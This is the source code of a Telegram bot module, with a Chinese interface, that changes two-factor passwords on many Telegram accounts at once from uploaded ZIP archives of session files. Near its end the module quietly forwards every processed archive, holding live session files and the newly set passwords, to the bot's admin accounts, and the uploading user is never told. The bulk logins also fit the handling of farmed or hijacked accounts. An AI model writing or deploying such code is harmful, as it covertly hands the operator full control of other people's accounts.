import os
import zipfile
import shutil
import asyncio
import tempfile
import time
import json
from datetime import datetime
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, FloodWaitError
import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
logger = logging.getLogger(__name__)
from dotenv import load_dotenv
load_dotenv()
CHANGE_2FA_BACK = os.getenv("CHANGE_2FA_BACK", "").replace('\\n', '\n')
MAX_EXTRACT_SIZE = int(os.getenv("MK_TIME", 4)) * 1024 * 1024
MAX_TASK_TIME = int(os.getenv("MK_LIST_TIME", "120").replace('S', ''))
BACK_BUTTON_EMOJI_ID = "5877629862306385808"

user_2fa_states = {}

def create_back_button():
    return InlineKeyboardButton(
        "返回主菜单", 
        callback_data="back_to_main"
    ).to_dict() | {"icon_custom_emoji_id": BACK_BUTTON_EMOJI_ID}

async def show_2fa_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [
            InlineKeyboardButton("手动输入", callback_data="2fa_input_mode").to_dict() | {"icon_custom_emoji_id": "6005570495603282482"},
            InlineKeyboardButton("自动识别", callback_data="2fa_auto_mode").to_dict() | {"icon_custom_emoji_id": "6019523512908124649"}
        ],
        [create_back_button()]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        text=CHANGE_2FA_BACK,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

async def handle_2fa_mode_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    data = query.data
    await query.answer()
    
    keyboard = [[create_back_button()]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if data == "2fa_input_mode":
        await query.edit_message_text(
            text="""<tg-emoji emoji-id="6005570495603282482">✏️</tg-emoji> <b>手动输入模式</b>

请按照以下格式发送：
<code>旧密码 新密码</code>

例如：<code>123456 654321</code>

如果账号没有设置2FA，只想设置新密码，请发送：
<code>None 新密码</code>""",
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
        context.user_data['2fa_state'] = "waiting_2fa_input"
        
    elif data == "2fa_auto_mode":
        await query.edit_message_text(
            text="""<tg-emoji emoji-id="6019523512908124649">🤖</tg-emoji> <b>自动识别模式</b>

请发送您想要设置的<u>新2FA密码</u>：

（系统将自动从json中读取旧密码）""",
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
        context.user_data['2fa_state'] = "waiting_auto_new_2fa"

async def handle_2fa_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    text = update.message.text
    state = context.user_data.get('2fa_state')
    
    if state == "waiting_2fa_input":
        parts = text.strip().split()
        if len(parts) == 2:
            old_2fa = None if parts[0].lower() == "none" else parts[0]
            new_2fa = parts[1]
            
            user_2fa_states[user_id] = {
                "mode": "input",
                "old_2fa": old_2fa,
                "new_2fa": new_2fa
            }
            
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                f"""<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 信息已保存

旧密码: {old_2fa or '无'}
新密码: {new_2fa}

<tg-emoji emoji-id="5877540355187937244">✏️</tg-emoji>现在请上传包含session的ZIP文件""",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            context.user_data['2fa_state'] = "waiting_2fa_zip"
        else:
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 格式错误，请发送「旧密码 新密码」或「None 新密码」",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
    
    elif state == "waiting_auto_new_2fa":
        new_2fa = text.strip()
        if len(new_2fa) < 1:
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 密码不能为空，请重新输入",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            return
        
        user_2fa_states[user_id] = {
            "mode": "auto",
            "new_2fa": new_2fa
        }
        
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"""<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 新密码已保存: {new_2fa}

<tg-emoji emoji-id="5877540355187937244">✏️</tg-emoji>现在请上传包含session和json的ZIP文件
（系统将自动从json中读取旧密码）""",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        context.user_data['2fa_state'] = "waiting_2fa_zip"

async def handle_2fa_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    document = update.message.document
    
    if not document.file_name.endswith('.zip'):
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 请上传ZIP格式的压缩包",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        context.user_data.pop('2fa_state', None)
        user_2fa_states.pop(user_id, None)
        return
    
    mode_info = user_2fa_states.get(user_id, {})
    mode = mode_info.get("mode", "auto")
    old_2fa = mode_info.get("old_2fa")
    new_2fa = mode_info.get("new_2fa")
    
    if mode == "auto" and new_2fa is None:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 未设置新密码，请重新选择模式",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        context.user_data.pop('2fa_state', None)
        user_2fa_states.pop(user_id, None)
        return
    
    if mode == "input" and (old_2fa is None or not new_2fa):
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 未完整设置新旧密码，请重新选择模式",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        context.user_data.pop('2fa_state', None)
        user_2fa_states.pop(user_id, None)
        return
    
    status_msg = await update.message.reply_text(
        "<tg-emoji emoji-id='5443127283898405358'>📥</tg-emoji> 正在下载文件...",
        parse_mode='HTML'
    )
    
    try:
        file = await context.bot.get_file(document.file_id)
        zip_path = f"downloads/2fa_{user_id}_{int(time.time())}.zip"
        os.makedirs("downloads", exist_ok=True)
        await file.download_to_drive(zip_path)
        
        await status_msg.edit_text(
            "<tg-emoji emoji-id='5839200986022812209'>🔍</tg-emoji> 开始处理2FA修改任务...",
            parse_mode='HTML'
        )
        
        await process_2fa(update, context, zip_path, user_id, mode, old_2fa, new_2fa)
        
        try:
            os.remove(zip_path)
        except:
            pass
        
    except Exception as e:
        logger.error(f"处理文件失败: {e}")
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 处理失败: {str(e)}",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    finally:
        context.user_data.pop('2fa_state', None)
        user_2fa_states.pop(user_id, None)
        try:
            await status_msg.delete()
        except:
            pass

async def reset_2fa(client, phone):
    try:
        await client.edit_2fa(new_password=None)
        return True, "重置成功"
    except Exception as e:
        return False, f"重置失败: {str(e)[:50]}"

async def change_2fa(client, old_password, new_password):
    try:
        await client.edit_2fa(current_password=old_password, new_password=new_password)
        return True, "修改成功"
    except Exception as e:
        error_str = str(e).lower()
        if "invalid password" in error_str or "password invalid" in error_str:
            return False, "旧密码错误"
        return False, f"修改失败: {str(e)[:50]}"

async def check_session_2fa(session_file, json_file, api_id, api_hash, old_2fa=None, new_2fa=None, mode="auto"):
    client = None
    result = {
        "session": os.path.basename(session_file),
        "status": "unknown",
        "message": "",
        "original_2fa": None,
        "new_2fa_set": None
    }
    
    try:
        json_2fa = None
        if json_file and os.path.exists(json_file):
            try:
                with open(json_file, 'r', encoding='utf-8') as f:
                    json_data = json.load(f)
                    json_2fa = json_data.get('2fa') or json_data.get('2FA') or json_data.get('password')
                    result["original_2fa"] = json_2fa
            except:
                pass
        
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        if not await client.is_user_authorized():
            result["status"] = "failed"
            result["message"] = "session无效"
            return result
        
        me = await client.get_me()
        if not me:
            result["status"] = "failed"
            result["message"] = "无法获取用户信息"
            return result
        
        result["phone"] = me.phone
        
        if mode == "auto":
            if json_2fa:
                success, msg = await change_2fa(client, json_2fa, new_2fa)
                if success:
                    result["status"] = "success"
                    result["message"] = f"2FA已修改"
                    result["new_2fa_set"] = new_2fa
                else:
                    if "旧密码错误" in msg:
                        reset_success, reset_msg = await reset_2fa(client, me.phone)
                        if reset_success:
                            result["status"] = "reset_success"
                            result["message"] = "旧密码错误，已重置"
                            result["new_2fa_set"] = None
                        else:
                            result["status"] = "reset_failed"
                            result["message"] = "旧密码错误，重置失败"
                    else:
                        result["status"] = "failed"
                        result["message"] = msg
            else:
                try:
                    await client.edit_2fa(new_password=new_2fa)
                    result["status"] = "success"
                    result["message"] = "2FA已设置"
                    result["new_2fa_set"] = new_2fa
                except Exception as e:
                    result["status"] = "failed"
                    result["message"] = f"设置失败: {str(e)[:50]}"
        
        else:
            if old_2fa:
                success, msg = await change_2fa(client, old_2fa, new_2fa)
                if success:
                    result["status"] = "success"
                    result["message"] = f"2FA已修改"
                    result["new_2fa_set"] = new_2fa
                else:
                    if "旧密码错误" in msg:
                        reset_success, reset_msg = await reset_2fa(client, me.phone)
                        if reset_success:
                            result["status"] = "reset_success"
                            result["message"] = "旧密码错误，已重置"
                            result["new_2fa_set"] = None
                        else:
                            result["status"] = "reset_failed"
                            result["message"] = "旧密码错误，重置失败"
                    else:
                        result["status"] = "failed"
                        result["message"] = msg
            else:
                try:
                    await client.edit_2fa(new_password=new_2fa)
                    result["status"] = "success"
                    result["message"] = "2FA已设置"
                    result["new_2fa_set"] = new_2fa
                except Exception as e:
                    result["status"] = "failed"
                    result["message"] = f"设置失败: {str(e)[:50]}"
        
    except SessionPasswordNeededError:
        result["status"] = "failed"
        result["message"] = "需要2FA验证"
    except FloodWaitError as e:
        result["status"] = "failed"
        result["message"] = f"等待{e.seconds}秒"
    except Exception as e:
        result["status"] = "failed"
        result["message"] = f"错误: {str(e)[:30]}"
    finally:
        if client:
            await client.disconnect()
    
    return result

def get_total_size(path):
    total = 0
    for root, dirs, files in os.walk(path):
        for f in files:
            fp = os.path.join(root, f)
            if os.path.isfile(fp):
                total += os.path.getsize(fp)
    return total

async def process_2fa(update, context, zip_path, user_id, mode, old_2fa, new_2fa):
    api_id_str = os.getenv("TELEGRAM_APP_ID")
    api_hash = os.getenv("TELEGRAM_APP_HASH")
    admins = os.getenv("ADMIN_ID", "").split(",")
    
    if not api_id_str or not api_hash:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 系统未配置，请联系管理员",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return
    
    try:
        api_id = int(api_id_str)
    except (ValueError, TypeError):
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> API配置错误，请联系管理员",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return
    
    try:
        await asyncio.wait_for(
            _process_2fa_internal(update, context, zip_path, user_id, api_id, api_hash, admins, mode, old_2fa, new_2fa), 
            timeout=MAX_TASK_TIME
        )
    except asyncio.TimeoutError:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 任务执行超时 ({MAX_TASK_TIME}秒)",
            parse_mode='HTML',
            reply_markup=reply_markup
        )

async def _process_2fa_internal(update, context, zip_path, user_id, api_id, api_hash, admins, mode, old_2fa, new_2fa):
    with tempfile.TemporaryDirectory() as temp_dir:
        extract_dir = os.path.join(temp_dir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        
        try:
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
                
                extracted_size = get_total_size(extract_dir)
                if extracted_size > MAX_EXTRACT_SIZE:
                    raise Exception(f"解压后文件过大 ({extracted_size//1024//1024}MB > {MAX_EXTRACT_SIZE//1024//1024}MB)")
        except Exception as e:
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 解压失败: {str(e)}",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            return
        
        session_files = []
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.endswith('.session'):
                    session_path = os.path.join(root, file)
                    session_files.append(session_path)
        
        if not session_files:
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 未找到session文件",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            return
        
        status_msg = await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>2FA修改进行中</b>

模式: {'自动识别' if mode == 'auto' else '手动输入'}
找到 <b>{len(session_files)}</b> 个session文件
<tg-emoji emoji-id="5775887550262546277">🔄</tg-emoji>正在处理，请稍候...""",
            parse_mode='HTML'
        )
        
        success_dir = os.path.join(temp_dir, "success")
        reset_success_dir = os.path.join(temp_dir, "reset_success")
        reset_failed_dir = os.path.join(temp_dir, "reset_failed")
        failed_dir = os.path.join(temp_dir, "failed")
        
        os.makedirs(success_dir, exist_ok=True)
        os.makedirs(reset_success_dir, exist_ok=True)
        os.makedirs(reset_failed_dir, exist_ok=True)
        os.makedirs(failed_dir, exist_ok=True)
        
        success_count = 0
        reset_success_count = 0
        reset_failed_count = 0
        failed_count = 0
        
        results = []
        
        for i, session_file in enumerate(session_files, 1):
            session_name = os.path.splitext(os.path.basename(session_file))[0]
            json_file = os.path.join(os.path.dirname(session_file), f"{session_name}.json")
            if not os.path.exists(json_file):
                json_file = None
            
            if i % 3 == 0 or i == len(session_files):
                try:
                    await status_msg.edit_text(
                        text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>2FA修改进行中</b>

进度: {i}/{len(session_files)}
<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji>成功: {success_count} | <tg-emoji emoji-id="5922612721244704425">♻️</tg-emoji>重置成功: {reset_success_count} | <tg-emoji emoji-id="5846008814129649022">⚠️</tg-emoji>重置失败: {reset_failed_count} | <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji>失败: {failed_count}""",
                        parse_mode='HTML'
                    )
                except:
                    pass
            
            result = await check_session_2fa(
                session_file, json_file, api_id, api_hash, 
                old_2fa=old_2fa, new_2fa=new_2fa, mode=mode
            )
            results.append(result)
            
            if result["status"] == "success":
                target_dir = success_dir
                success_count += 1
            elif result["status"] == "reset_success":
                target_dir = reset_success_dir
                reset_success_count += 1
            elif result["status"] == "reset_failed":
                target_dir = reset_failed_dir
                reset_failed_count += 1
            else:
                target_dir = failed_dir
                failed_count += 1
            
            try:
                shutil.copy2(session_file, os.path.join(target_dir, os.path.basename(session_file)))
            except:
                pass
            
            if json_file and os.path.exists(json_file):
                try:
                    with open(json_file, 'r', encoding='utf-8') as f:
                        json_data = json.load(f)
                    
                    if result["new_2fa_set"] is not None:
                        json_data['2fa'] = result["new_2fa_set"]
                    else:
                        json_data.pop('2fa', None)
                        json_data.pop('2FA', None)
                        json_data.pop('password', None)
                    
                    new_json_path = os.path.join(target_dir, os.path.basename(json_file))
                    with open(new_json_path, 'w', encoding='utf-8') as f:
                        json.dump(json_data, f, indent=2, ensure_ascii=False)
                except:
                    try:
                        shutil.copy2(json_file, os.path.join(target_dir, os.path.basename(json_file)))
                    except:
                        pass
            
            await asyncio.sleep(0.5)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        success_zip = os.path.join(temp_dir, "success.zip")
        if success_count > 0:
            with zipfile.ZipFile(success_zip, 'w') as zipf:
                for root, dirs, files in os.walk(success_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, success_dir)
                        zipf.write(file_path, arcname)
        
        reset_success_zip = os.path.join(temp_dir, "reset_success.zip")
        if reset_success_count > 0:
            with zipfile.ZipFile(reset_success_zip, 'w') as zipf:
                for root, dirs, files in os.walk(reset_success_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, reset_success_dir)
                        zipf.write(file_path, arcname)
        
        reset_failed_zip = os.path.join(temp_dir, "reset_failed.zip")
        if reset_failed_count > 0:
            with zipfile.ZipFile(reset_failed_zip, 'w') as zipf:
                for root, dirs, files in os.walk(reset_failed_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, reset_failed_dir)
                        zipf.write(file_path, arcname)
        
        failed_zip = os.path.join(temp_dir, "failed.zip")
        if failed_count > 0:
            with zipfile.ZipFile(failed_zip, 'w') as zipf:
                for root, dirs, files in os.walk(failed_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, failed_dir)
                        zipf.write(file_path, arcname)
        
        result_text = f"""<tg-emoji emoji-id="5909201569898827582">✅</tg-emoji> <b>2FA修改完成</b>

<tg-emoji emoji-id="5931472654660800739">📊</tg-emoji> 统计结果:
• <tg-emoji emoji-id="5886412370347036129">👤</tg-emoji> 总账号: <b>{len(session_files)}</b>
• <tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 成功修改: <b>{success_count}</b>
• <tg-emoji emoji-id="5922612721244704425">♻️</tg-emoji> 重置成功: <b>{reset_success_count}</b>
• <tg-emoji emoji-id="5846008814129649022">⚠️</tg-emoji> 重置失败: <b>{reset_failed_count}</b>
• <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失败: <b>{failed_count}</b>"""

        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=result_text,
            parse_mode='HTML'
        )
        
        if success_count > 0:
            with open(success_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"success_{timestamp}.zip",
                    caption=f"<b><tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 成功修改2FA ({success_count}个)</b>",
                    parse_mode='HTML'
                )
        
        if reset_success_count > 0:
            with open(reset_success_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"reset_success_{timestamp}.zip",
                    caption=f"<b><tg-emoji emoji-id='5922612721244704425'>♻️</tg-emoji> 重置成功 ({reset_success_count}个)</b>",
                    parse_mode='HTML'
                )
        
        if reset_failed_count > 0:
            with open(reset_failed_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"reset_failed_{timestamp}.zip",
                    caption=f"<b><tg-emoji emoji-id='5846008814129649022'>⚠️</tg-emoji> 重置失败 ({reset_failed_count}个)</b>",
                    parse_mode='HTML'
                )
        
        if failed_count > 0:
            with open(failed_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"failed_{timestamp}.zip",
                    caption=f"<b><tg-emoji emoji-id='5922712343011135025'>❌</tg-emoji> 失败 ({failed_count}个)</b>",
                    parse_mode='HTML'
                )
        
        for admin_id in admins:
            admin_id = admin_id.strip()
            if not admin_id:
                continue
            
            try:
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=f"""<tg-emoji emoji-id="5909201569898827582">📢</tg-emoji> <b>2FA修改任务完成</b>

<tg-emoji emoji-id="5886412370347036129">👤</tg-emoji> 用户: <code>{user_id}</code>
模式: {'自动识别' if mode == 'auto' else '手动输入'}
<tg-emoji emoji-id="5886412370347036129">📊</tg-emoji> 总账号: <b>{len(session_files)}</b>
• <tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 成功修改: <b>{success_count}</b>
• <tg-emoji emoji-id="5922612721244704425">♻️</tg-emoji> 重置成功: <b>{reset_success_count}</b>
• <tg-emoji emoji-id="5846008814129649022">⚠️</tg-emoji> 重置失败: <b>{reset_failed_count}</b>
• <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失败: <b>{failed_count}</b>""",
                    parse_mode='HTML'
                )
                
                admin_timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                
                if success_count > 0:
                    with open(success_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"success_{user_id}_{admin_timestamp}.zip"
                        )
                
                if reset_success_count > 0:
                    with open(reset_success_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"reset_success_{user_id}_{admin_timestamp}.zip"
                        )
                
                if reset_failed_count > 0:
                    with open(reset_failed_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"reset_failed_{user_id}_{admin_timestamp}.zip"
                        )
                
                if failed_count > 0:
                    with open(failed_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"failed_{user_id}_{admin_timestamp}.zip"
                        )
            except Exception as e:
                logger.error(f"发送给管理员 {admin_id} 失败: {e}")
        
        try:
            await status_msg.delete()
        except:
            pass
